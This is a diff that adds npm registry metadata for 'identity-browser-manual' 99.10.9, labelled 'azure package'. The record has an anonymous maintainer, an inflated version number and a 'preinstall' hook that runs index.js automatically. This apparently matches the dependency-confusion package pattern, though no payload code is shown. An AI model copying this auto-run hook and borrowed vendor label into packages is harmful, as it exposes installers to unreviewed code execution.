@@ -1,0 +1,62 @@
+{
+    "_id": "identity-browser-manual",
+    "name": "identity-browser-manual",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "identity-browser-manual",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "identity-browser-manual@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-cDdAvCas21adXzcfZKkMEhWMKQSfkRX4ivp9JSEW7Bh5yUQXEPLwNokj+vAmtdBp4nHW0MKoQsdZRWpdeGc8jw==",
+                "shasum": "21a1f0e737c06e6bc38a837f2babffcb439f97a2",
+                "tarball": "https://registry.npmjs.org/identity-browser-manual/-/identity-browser-manual-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5075,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOzu2ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo/eg/+KxvekG7oX8Ii3RqZjN1soso3mR1/suzzxu8RmEZbtwyhfIAy\r\nLXmQDRSQcCuU9RtP4z5SuHG5DJapyuyz0338Bnb45KIkltdSPq/QyIKcZSjU\r\nmj2KHHaKhxMUhLCHrvZY45C1tkVCxDxCrqDUlGdyPGNYz5d3H5DkcZvoN9L8\r\n1zQP1lMGMIgWx3Rf/qjoR6acAR/1yCh1zQ9FIF+n9QoIGtX4HYDoEIJFa33W\r\nca2d7Tx7cvvhFD0MxB8qhYh5PNwrfdkpVZ7/u3DG4FxVylU2QDfSmJn/JaCy\r\nRB048l8JN1xip7rXSXYWpe4QJ0KXdGe6AA2Sx0ZV5jkl0/5w0G6ge57phOUl\r\nMfgOv/ngBjSf728Kw4sVrxiGKCLX+gNkJpMo8xoRJKtpSI5joM/YtpU/Jmcg\r\nP1KlOg4Bow2tdk4P2BXiteJ7ILiWDk7AKlr2QawXgxJUvzNPLU5Kp8ATjerR\r\nIjBh5kxYhCbGzJcAXoibUr15AXkhiJQ209HQx3iy2IO5AmvlnMxvBGNdC+vM\r\niyaRoUKihE51IPVoGIiHHRniHaR7Sdnb6F3gXm/eEisOSZ4MYCBCgnUcX/7e\r\nPzJOIXOow/1He7Har153rSlO0y9PFceuSNpKApbcaki+Ei9SmRMVXc6gXD+j\r\n3gajDuEHODFkJfLi3b4237ROR0l90PS8RP0=\r\n=UbIj\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ulbyji03",
+                "email": "ulbyji03@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ulbyji03",
+                    "email": "ulbyji03@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/identity-browser-manual_99.10.9_1648049078296_0.20207691613803336"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T15:24:38.296Z",
+        "99.10.9": "2022-03-23T15:24:38.384Z",
+        "modified": "2022-03-23T15:24:38.477Z"
+    },
+    "maintainers": [
+        {
+            "name": "ulbyji03",
+            "email": "ulbyji03@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
